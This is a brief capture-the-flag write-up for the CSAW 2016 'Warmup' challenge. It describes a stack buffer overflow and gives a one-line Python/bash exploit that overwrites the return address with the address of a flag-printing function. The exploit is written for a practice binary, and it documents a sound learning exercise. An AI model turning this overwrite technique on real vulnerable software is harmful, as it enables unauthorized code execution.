# CSAW16 Warmup
Warmup was a easy `Buffer Overflow` challenge, the task was to overwrite our return value with the address of the `easy` function, which will print our flag

I used the following one liner to win the challenge
```bash
./warmup <<<$(python -c 'print("A"*72 + "\x0d\x06\x40\x00\x00\x00\x00\x00")')
```
